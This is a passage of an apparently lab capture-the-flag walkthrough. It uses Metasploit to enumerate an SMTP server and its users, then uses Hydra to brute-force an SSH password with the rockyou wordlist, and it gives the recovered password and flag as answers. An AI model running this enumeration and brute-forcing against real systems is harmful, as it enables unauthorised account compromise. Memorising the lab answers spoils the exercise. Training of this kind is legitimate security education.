</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>RHOSTS yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploi
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>t.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>RPORT <span style="color:#fab387">25</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>THREADS <span style="color:#fab387">1</span> yes The number of concurrent threads <span style="color:#89dceb;font-weight:bold">(</span>max one per host<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>View the full module info with the info, or info -d command.</span></span></code></pre></div>
<br>
<p>Have a look through the options, does everything seem correct? What is the option we need to set?</p>






<pre tabindex="0"><code>RHOSTS</code></pre>
<br>
<p>Set that to the correct value for your target machine. Then run the exploit. What&rsquo;s the system mail name?</p>






<pre tabindex="0"><code>polosmtp.home</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> rhosts 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#f5e0dc">rhosts</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span> &gt; run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - 10.10.54.3:25 SMTP <span style="color:#fab387">220</span> polosmtp.home ESMTP Postfix <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu<span style="color:#89dceb;font-weight:bold">)</span><span style="color:#89b4fa">\x</span>0d<span style="color:#89b4fa">\x</span>0a
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - Scanned <span style="color:#fab387">1</span> of <span style="color:#fab387">1</span> hosts <span style="color:#89dceb;font-weight:bold">(</span>100% <span style="color:#89dceb">complete</span><span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed</span></span></code></pre></div>
<br>
<p>What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.</p>






<pre tabindex="0"><code>Postfix</code></pre>
<br>
<p>Good! We&rsquo;ve now got a good amount of information on the target system to move onto the next stage. Let&rsquo;s search for the module <code>smtp_enum</code>, what is the full module name?</p>






<pre tabindex="0"><code>auxiliary/scanner/smtp/smtp_enum</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span> &gt; search smtp_enum
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#6c7086;font-style:italic"># Matching Modules</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#6c7086;font-style:italic"># Name Disclosure Date Rank Check Description</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#fab387">0</span> auxiliary/scanner/smtp/smtp_enum normal No SMTP User Enumeration Utility
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Interact with a module by name or index. For example info 0, use <span style="color:#fab387">0</span> or use auxiliary/scanner/smtp/smtp_enum
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span> &gt;</span></span></code></pre></div>
<br>
<p>We&rsquo;re going to be using the <code>top-usernames-shortlist.txt</code> wordlist from the usernames subsection of seclists (/usr/share/wordlists/SecLists/usernames if you have it installed).
Seclists is an amazing collection of wordlists. If you&rsquo;re running Kali or Parrot you can install seclists with: <code>sudo apt install seclists</code>.</p>
<br>
<p>What option do we need to set to the wordlist&rsquo;s path?</p>






<pre tabindex="0"><code>USER_FILE</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_enum<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/scanner/smtp/smtp_enum<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>RHOSTS yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metaspl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>oit/basics/using-metasploit.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>RPORT <span style="color:#fab387">25</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>THREADS <span style="color:#fab387">1</span> yes The number of concurrent threads <span style="color:#89dceb;font-weight:bold">(</span>max one per host<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>UNIXONLY <span style="color:#89dceb">true</span> yes Skip Microsoft bannered servers when testing unix users
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>USER_FILE /opt/metasploit-framework/embedded/fram yes The file that contains a list of probable users accounts.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>ework/data/wordlists/unix_users.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>View the full module info with the info, or info -d command.</span></span></code></pre></div>
<br>
<p>Once we&rsquo;ve set this option, what is the other essential parameter we need to set?</p>






<pre tabindex="0"><code>RHOSTS</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_enum<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span><span style="color:#f5e0dc">USER_FILE</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_enum<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> RHOSTS 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#f5e0dc">RHOSTS</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_enum<span style="color:#89dceb;font-weight:bold">)</span> &gt; run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - 10.10.54.3:25 Banner: <span style="color:#fab387">220</span> polosmtp.home ESMTP Postfix <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - 10.10.54.3:25 Users found: administrator
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - Scanned <span style="color:#fab387">1</span> of <span style="color:#fab387">1</span> hosts <span style="color:#89dceb;font-weight:bold">(</span>100% <span style="color:#89dceb">complete</span><span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed</span></span></code></pre></div>
<br>
<p>What username is returned?</p>






<pre tabindex="0"><code>administrator</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - 10.10.54.3:25 Users found: administrator</span></span></code></pre></div>
<br>
<h4 id="exploiting-smtp">Exploiting SMTP</h4>
<p>At the end of our Enumeration section we have a few vital pieces of information:</p>
<ol>
<li>A user account name</li>
<li>The type of SMTP server and Operating System running.</li>
</ol>
<p>We know from our port scan, that the only other open port on this machine is an SSH login. We&rsquo;re going to use this information to try and bruteforce the password of the SSH login for our user using Hydra.</p>
<p>There is a wide array of customizability when it comes to using Hydra. Hydra uses dictionary attacks primarily, both Kali Linux and Parrot OS have many different wordlists in the <code>/usr/share/wordlists directory</code>  If you would like to browse and find a different wordlists to the widely used &ldquo;rockyou.txt&rdquo;.</p>
<p>The syntax for the command we&rsquo;re going to use to find the password is this:</p>
<p><code>hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.54.3 ssh</code></p>
<ul>
<li><code>hydra</code>: runs the hydra tool</li>
<li><code>-t 16</code>: number of parallel connections per target</li>
<li><code>-l [user]</code>: points to the user whose account you&rsquo;re trying to compromise</li>
<li><code>-P [path to dictionary]</code>: points to the file containing the list of possible passwords</li>
<li><code>-vV</code>: sets verbose mode to very verbose, shows the login+pass combination for each attempt</li>
<li><code>[machine ip]</code>: the IP address of the target machine</li>
<li><code>ssh / protocol</code>: sets the protocol</li>
</ul>
<br>
<p>What is the password of the user we found during our enumeration stage?</p>






<pre tabindex="0"><code>alejandro</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# hydra -t <span style="color:#fab387">16</span> -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.54.3 ssh
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Hydra v8.6 <span style="color:#89dceb;font-weight:bold">(</span>c<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#fab387">2017</span> by van Hauser/THC - Please <span style="color:#cba6f7">do</span> not use in military or secret service organizations, or <span style="color:#cba6f7">for</span> illegal purposes.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Hydra <span style="color:#89dceb;font-weight:bold">(</span>http://www.thc.org/thc-hydra<span style="color:#89dceb;font-weight:bold">)</span> starting at 2024-06-26 04:28:32
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#89dceb;font-weight:bold">[</span>WARNING<span style="color:#89dceb;font-weight:bold">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#fab387">4</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">[</span>DATA<span style="color:#89dceb;font-weight:bold">]</span> max <span style="color:#fab387">16</span> tasks per <span style="color:#fab387">1</span> server, overall <span style="color:#fab387">16</span> tasks, <span style="color:#fab387">14344398</span> login tries <span style="color:#89dceb;font-weight:bold">(</span>l:1/p:14344398<span style="color:#89dceb;font-weight:bold">)</span>, ~896525 tries per task
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>DATA<span style="color:#89dceb;font-weight:bold">]</span> attacking ssh://10.10.54.3:22/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>VERBOSE<span style="color:#89dceb;font-weight:bold">]</span> Resolving addresses ... <span style="color:#89dceb;font-weight:bold">[</span>VERBOSE<span style="color:#89dceb;font-weight:bold">]</span> resolving <span style="color:#cba6f7">done</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>INFO<span style="color:#89dceb;font-weight:bold">]</span> Testing <span style="color:#cba6f7">if</span> password authentication is supported by ssh://administrator@10.10.54.3:22
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>INFO<span style="color:#89dceb;font-weight:bold">]</span> Successful, password authentication is supported by ssh://10.10.54.3:22
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;123456&#34;</span> - <span style="color:#fab387">1</span> of <span style="color:#fab387">14344398</span> <span style="color:#89dceb;font-weight:bold">[</span>child 0<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;12345&#34;</span> - <span style="color:#fab387">2</span> of <span style="color:#fab387">14344398</span> <span style="color:#89dceb;font-weight:bold">[</span>child 1<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/0<span style="color:#89dceb;font-weight:bold">)</span></span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;killer&#34;</span> - <span style="color:#fab387">143</span> of <span style="color:#fab387">14344401</span> <span style="color:#89dceb;font-weight:bold">[</span>child 11<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;sandra&#34;</span> - <span style="color:#fab387">144</span> of <span style="color:#fab387">14344401</span> <span style="color:#89dceb;font-weight:bold">[</span>child 14<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;alejandro&#34;</span> - <span style="color:#fab387">145</span> of <span style="color:#fab387">14344401</span> <span style="color:#89dceb;font-weight:bold">[</span>child 15<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;buster&#34;</span> - <span style="color:#fab387">146</span> of <span style="color:#fab387">14344401</span> <span style="color:#89dceb;font-weight:bold">[</span>child 10<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;george&#34;</span> - <span style="color:#fab387">147</span> of <span style="color:#fab387">14344401</span> <span style="color:#89dceb;font-weight:bold">[</span>child 4<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#89dceb;font-weight:bold">[</span>22<span style="color:#89dceb;font-weight:bold">][</span>ssh<span style="color:#89dceb;font-weight:bold">]</span> host: 10.10.54.3 login: administrator password: alejandro
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span><span style="color:#89dceb;font-weight:bold">[</span>STATUS<span style="color:#89dceb;font-weight:bold">]</span> attack finished <span style="color:#cba6f7">for</span> 10.10.54.3 <span style="color:#89dceb;font-weight:bold">(</span>waiting <span style="color:#cba6f7">for</span> children to <span style="color:#89dceb">complete</span> tests<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span><span style="color:#fab387">1</span> of <span style="color:#fab387">1</span> target successfully completed, <span style="color:#fab387">1</span> valid password found</span></span></code></pre></div>
<br>
<p>Great! Now, let&rsquo;s SSH into the server as the user, what is contents of smtp.txt</p>






<pre tabindex="0"><code>THM{who_knew_email_servers_were_c00l?}</code></pre>






